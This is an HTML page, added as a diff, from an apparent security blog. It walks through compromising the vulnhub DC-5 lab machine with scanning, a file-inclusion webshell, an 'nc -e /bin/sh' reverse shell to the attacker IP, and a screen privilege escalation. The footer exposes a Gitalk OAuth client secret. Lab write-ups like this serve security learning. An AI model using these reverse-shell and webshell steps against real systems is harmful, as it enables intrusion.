@@ -1,0 +1,274 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>vulnhub DC-5 靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="vulnhub DC-5 靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="DC-5 靶机
+前言：
+这个靶机的难度相对于前面的难度更高。涉及到的知识有文件包含漏洞，反弹shell  以及后期的权限提升难度也是比较大的。
+过关条件：得到root权限，获取flag
+攻击机 ： kali            192.1..." />
+    <meta name="keywords" content="vulnhub" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              vulnhub DC-5 靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-15
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/gd7wNOhQ5/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h4 id="dc-5-靶机">DC-5 靶机</h4>
+<p>前言：</p>
+<p>这个靶机的难度相对于前面的难度更高。涉及到的知识有文件包含漏洞，反弹shell  以及后期的权限提升难度也是比较大的。</p>
+<p>过关条件：得到root权限，获取flag</p>
+<p>攻击机 ： kali            192.168.56.132</p>
+<p>受害机 ： DC-5          192.168.56.146</p>
+<h5 id="内网信息探测">内网信息探测</h5>
+<pre><code class="language-shell">arp-scan -l         //通过mac地址确定靶机IP为 192.168.56.146
+
+nmap -A -p1-65535 -T4 192.168.56.146    //扫描开放端口 80  111 50060
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308093503597.png" alt="image-20230308093503597" loading="lazy"></figure>
+<p>开放80端口，存在web页面。可交互页面少，需要进行文件路径暴破。</p>
+<h5 id="暴破路径">暴破路径</h5>
+<p>使用kali自带的 dirsearch</p>
+<h5 id=""><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308094035447.png" alt="image-20230308094035447" loading="lazy"></h5>
+<p>发现页面没有见过的文件 footer.php</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308094237073.png" alt="image-20230308094237073" loading="lazy"></figure>
+<p>对比thankyou.php</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308094322623.png" alt="image-20230308094322623" loading="lazy"></figure>
+<p>发现会随着刷新而改变</p>
+<p>猜测文件包含漏洞。</p>
+<h5 id="文件包含漏洞">文件包含漏洞</h5>
+<p>通过burp路径发现为 file下 ，然后写入一句话马。访问日志，发现成功写入</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308095513472.png" alt="image-20230308095513472" loading="lazy"></figure>
+<p>使用蚁剑连接。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308095556973.png" alt="image-20230308095556973" loading="lazy"></figure>
+<h5 id="反弹shell">反弹shell</h5>
+<pre><code class="language-shell">nc -e /bin/sh 192.168.56.132 6666  //设置反弹shell
+
+nc -lvnp 6666
+//不是完整的shell环境 使用python的pty模块
+python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308100055064.png" alt="image-20230308100055064" loading="lazy"></figure>
+<h5 id="权限提升">权限提升</h5>
+<p>根据命令得到存在 scree 4.50 提权漏洞</p>
+<p>根据提示内容做文件。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311203027822.png" alt="image-20230311203027822" loading="lazy"></figure>
+<p>将做出来的两个文件上传到靶机当中。</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311203422146.png" alt="image-20230311203422146" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311203457281.png" alt="image-20230311203457281" loading="lazy"></figure>
+<p>执行操作</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311203517201.png" alt="image-20230311203517201" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311203532870.png" alt="image-20230311203532870" loading="lazy"></figure>
+<h5 id="总结">总结</h5>
+<p>难点在于对于提权文件的制作，以及前期对于文件包含漏洞的发现。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#dc-5-%E9%9D%B6%E6%9C%BA">DC-5 靶机</a>
+<ul>
+<li><a href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B">内网信息探测</a></li>
+<li><a href="#%E6%9A%B4%E7%A0%B4%E8%B7%AF%E5%BE%84">暴破路径</a></li>
+<li><a href="#">!image-20230308094035447</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">文件包含漏洞</a></li>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/you-shou-jiu-hui-de-burp-zhua-qu-an-zhuo-app-shu-ju-bao-jiao-cheng/">
+              <h3 class="post-title">
+                有手就会的burp抓取安卓数据包教程
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
